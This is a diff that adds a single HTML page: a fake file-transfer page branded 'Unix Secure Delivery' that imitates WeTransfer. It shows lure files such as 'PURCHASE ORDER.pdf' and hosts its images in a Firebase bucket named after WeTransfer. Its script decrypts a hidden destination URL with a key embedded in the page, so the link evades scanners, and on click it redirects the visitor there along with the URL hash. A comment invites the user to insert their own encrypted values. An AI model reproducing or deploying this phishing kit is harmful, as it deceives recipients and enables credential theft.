@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Unix Secure Delivery</title>
+
+<style>
+:root{
+  --brand:#0f766e;
+  --brand-dark:#115e59;
+  --text:#1f2937;
+  --muted:#6b7280;
+}
+
+/* =====================
+   PAGE BACKGROUND
+===================== */
+body{
+  margin:0;
+  min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-family:Arial,Helvetica,sans-serif;
+  background:
+    linear-gradient(rgba(255,255,255,.9), rgba(255,255,255,.9)),
+    url("https://images.unsplash.com/photo-1521737604893-d14cc237f11d?auto=format&fit=crop&w=1600&q=80");
+  background-size:cover;
+  background-position:center;
+  color:var(--text);
+}
+
+/* =====================
+   MAIN CARD
+===================== */
+.wrapper{
+  background:#ffffff;
+  padding:28px;
+  border-radius:18px;
+  max-width:1100px;
+  width:94%;
+  box-shadow:0 30px 60px rgba(0,0,0,.18);
+}
+
+/* =====================
+   HEADER
+===================== */
+.header{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  margin-bottom:14px;
+}
+.header .left{
+  display:flex;
+  align-items:center;
+  gap:10px;
+}
+.header img{
+  width:42px;
+  height:42px;
+  object-fit:contain;
+}
+.header .right{
+  font-size:22px;
+  font-weight:800;
+  letter-spacing:.4px;
+}
+
+.sub{font-size:14px;color:var(--muted);margin-top:2px}
+.notice{margin-top:8px;font-size:13px}
+
+/* =====================
+   GRID (RESPONSIVE)
+===================== */
+.grid{
+  display:grid;
+  grid-template-columns:repeat(4,1fr);
+  gap:18px;
+  margin:26px 0 18px;
+}
+@media(max-width:900px){
+  .grid{grid-template-columns:repeat(2,1fr)}
+}
+@media(max-width:560px){
+  .grid{grid-template-columns:1fr}
+}
+
+/* =====================
+   FILE CARD
+===================== */
+.card{
+  border-radius:14px;
+  background:#f8fafc;
+  border:1px solid #e5e7eb;
+  cursor:pointer;
+  overflow:hidden;
+  transition:.2s ease;
+}
+.card:hover{
+  border-color:var(--brand);
+  box-shadow:0 10px 22px rgba(0,0,0,.12);
+}
+
+.thumb{
+  position:relative;
+  width:100%;
+  aspect-ratio:4/3; /* WeTransfer-like */
+  overflow:hidden;
+}
+.thumb img{
+  width:100%;
+  height:100%;
+  object-fit:cover;
+  transition:transform .35s ease;
+}
+.card:hover .thumb img{transform:scale(1.08)}
+
+/* file label overlay */
+.label{
+  position:absolute;
+  left:10px;
+  bottom:10px;
+  background:rgba(0,0,0,.65);
+  color:#fff;
+  padding:6px 10px;
+  border-radius:999px;
+  font-size:12px;
+  display:flex;
+  align-items:center;
+  gap:6px;
+}
+.label img{width:14px;height:14px}
+
+/* =====================
+   SHIMMER ON CLICK
+===================== */
+.card.loading::after{
+  content:"";
+  position:absolute;
+  inset:0;
+  background:linear-gradient(110deg, transparent 25%, rgba(255,255,255,.6) 37%, transparent 63%);
+  background-size:200% 100%;
+  animation:shimmer 1.2s linear infinite;
+}
+@keyframes shimmer{to{background-position:-200% 0}}
+
+/* =====================
+   BUTTON + PROGRESS
+===================== */
+button{
+  width:100%;
+  padding:14px;
+  border-radius:12px;
+  border:none;
+  background:linear-gradient(135deg,var(--brand),var(--brand-dark));
+  color:#fff;
+  font-size:15px;
+  font-weight:600;
+  cursor:pointer;
+}
+.progress{
+  display:none;
+  margin-top:16px;
+  height:8px;
+  background:#e5e7eb;
+  border-radius:99px;
+  overflow:hidden;
+}
+.bar{
+  height:100%;
+  width:0%;
+  background:linear-gradient(90deg,var(--brand),#22c55e);
+  animation:load 1.4s linear forwards;
+}
+@keyframes load{to{width:100%}}
+
+.footer{
+  margin-top:14px;
+  font-size:12px;
+  color:#94a3b8;
+  text-align:center;
+}
+</style>
+</head>
+
+<body>
+
+<div class="wrapper">
+
+  <!-- HEADER -->
+  <div class="header">
+    <div class="left">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Logo_TV_2015.png" alt="logo" />
+    </div>
+    <div class="right">Unix</div>
+  </div>
+
+  <div class="sub" id="subtitle"></div>
+  <div class="notice" id="notice"></div>
+
+  <!-- FILE GRID -->
+  <div class="grid">
+
+    <div class="card" onclick="trigger(this,'vid')">
+      <div class="thumb">
+        <img src="https://firebasestorage.googleapis.com/v0/b/wetransfer-rd176.appspot.com/o/t1.png?alt=media&token=a94fa1df-86f0-410c-8e5a-a834f0f96f0b">
+        <div class="label"><img src="https://firebasestorage.googleapis.com/v0/b/wetransfer-rd176.appspot.com/o/vid.png?alt=media&token=ce9b3d1e-c28a-47c2-a045-6e32319d727b">FW47_Diperson.mov</div>
+      </div>
+    </div>
+
+    <div class="card" onclick="trigger(this,'img')">
+      <div class="thumb">
+        <img src="https://firebasestorage.googleapis.com/v0/b/wetransfer-rd176.appspot.com/o/t2.png?alt=media&token=934c8095-4d76-408b-84ad-e5a87323d28a">
+        <div class="label"><img src="https://firebasestorage.googleapis.com/v0/b/wetransfer-rd176.appspot.com/o/jp.png?alt=media&token=f3b2ae21-f59a-47fd-bb47-58b0163e56b4">Drawings_sketches.png</div>
+      </div>
+    </div>
+
+    <div class="card" onclick="trigger(this,'pdf')">
+      <div class="thumb">
+        <img src="https://firebasestorage.googleapis.com/v0/b/wetransfer-rd176.appspot.com/o/t3.png?alt=media&token=5199c01c-5bf6-43c0-bf34-dd57d1d695d4">
+        <div class="label"><img src="https://firebasestorage.googleapis.com/v0/b/wetransfer-rd176.appspot.com/o/p.png?alt=media&token=71a9944c-1fd7-4f03-a70c-61c3fb582ac0">PURCHASE ORDER.pdf</div>
+      </div>
+    </div>
+
+    <div class="card" onclick="trigger(this,'xls')">
+      <div class="thumb">
+        <img src="https://firebasestorage.googleapis.com/v0/b/wetransfer-rd176.appspot.com/o/t4.png?alt=media&token=df675347-6cd5-47a9-a880-6e16f290d0ad">
+        <div class="label"><img src="https://firebasestorage.googleapis.com/v0/b/wetransfer-rd176.appspot.com/o/sheet.png?alt=media&token=288c21a6-19be-484d-a2e3-b30c020a1b28">Specification.xlsx</div>
+      </div>
+    </div>
+
+  </div>
+
+  <button onclick="trigger(null)">Download all files</button>
+  <div class="progress" id="progress"><div class="bar"></div></div>
+
+  <div class="footer">© Unix Secure Delivery</div>
+</div>
+
+<script>
+/* =====================================
+   🔒 INSERT YOUR ENCRYPTED VALUES
+===================================== */
+const e = "gwfNoshO0asd4/X7AQcF2g9jOgc/qRcd4FrUvE82kTyp3xCSphIRMbfZSn3fWi73pX0L3hzc+xVW7VnWZYFanqQ4j7c=";
+const t = "TDn4ZXVAiHcfPRB9";
+const n = "ER3w4aPy1vSfm4KxJtCB0g==";
+
+
+/* =====================================
+   🌍 LANGUAGE AUTO-DETECT
+===================================== */
+const lang = (navigator.language || 'en').toLowerCase();
+const i18n = {
+  en:{ sub:"File transfer received", notice:"The shared document is ready for download" },
+  fr:{ sub:"Transfert de fichiers reçu", notice:"Le document partagé est prêt" },
+  es:{ sub:"Transferencia recibida", notice:"El documento está listo" }
+};
+const L = i18n[lang.slice(0,2)] || i18n.en;
+document.getElementById('subtitle').textContent = L.sub;
+document.getElementById('notice').textContent = L.notice;
+
+/* =====================================
+   🔐 DECRYPT + HASH CARRYOVER
+===================================== */
+const te=new TextEncoder(), td=new TextDecoder();
+const b64=s=>Uint8Array.from(atob(s),c=>c.charCodeAt(0));
+
+async function decrypt(){
+  const master=await crypto.subtle.importKey(
+    "raw", te.encode("client-side-secret"),
+    "PBKDF2", false, ["deriveKey"]
+  );
+  const key=await crypto.subtle.deriveKey(
+    {name:"PBKDF2",salt:b64(n),iterations:500000,hash:"SHA-256"},
+    master,{name:"AES-GCM",length:256},false,["decrypt"]
+  );
+  const dec=await crypto.subtle.decrypt(
+    {name:"AES-GCM",iv:b64(t)}, key, b64(e)
+  );
+  return td.decode(dec);
+}
+
+function trigger(el, tag=""){
+  document.getElementById("progress").style.display="block";
+  if(el) el.classList.add("loading");
+
+  setTimeout(async ()=>{
+    try{
+      const base = await decrypt();
+      const hash = location.hash ? location.hash : "";
+      const target = tag ? `${base}?f=${tag}${hash}` : `${base}${hash}`;
+      location.href = target;
+    }catch(err){
+      console.error("DECRYPT ERROR:", err);
+    }
+  },1400);
+}
+</script>
+
+</body>
+</html>
